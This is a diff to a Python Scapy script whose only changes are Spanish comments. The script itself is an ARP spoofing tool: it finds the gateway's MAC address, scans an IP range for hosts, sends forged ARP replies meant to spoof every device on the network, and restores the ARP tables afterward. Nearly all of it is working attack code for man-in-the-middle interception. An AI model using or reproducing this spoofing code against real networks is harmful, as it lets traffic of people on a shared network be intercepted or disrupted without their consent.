@@ -14,23 +14,28 @@ parse.add_argument("-g", "--gateway", help="Gateway")
 parse = parse.parse_args()
 
 
+# obtener la direccion mac
 def get_mac(gateway):
+	# crear capas
 	arp_layer = ARP(pdst=gateway)
 	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-
+	# paquete final con las dos capas ya armadas
 	final_packet = broadcast / arp_layer
 
+	# mandar el paquete
 	mac = srp(final_packet, timeout=2, verbose=False)[0]
 	mac = mac[0][1].hwsrc
 	return mac
 
 
+# escanear todo el rango de direccion ip
 def scanner_red(rango,gateway):
 	lista_hosts = dict()
 
+	# crear capas
 	arp_layer = ARP(pdst=rango)
 	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-
+	# paquete final con las dos capas ya armadas
 	final_packet = broadcast / arp_layer
 
 	answers = srp(final_packet, timeout=2, verbose=False)[0]
@@ -46,6 +51,7 @@ def scanner_red(rango,gateway):
 	return lista_hosts
 
 
+# restaurar las tablas arp
 def restore_arp(destip,sourceip,hwsrc,hwdst):
 	dest_mac = hwdst
 	source_mac = hwsrc
@@ -53,6 +59,7 @@ def restore_arp(destip,sourceip,hwsrc,hwdst):
 	send(packet, verbose=False)
 
 
+# spoofear todos los dispositivos conectados a la red
 def arp_spoofing(hwdst,pdst,psrc):
 	spoofer_packet = ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc)
 	send(spoofer_packet, verbose=False)
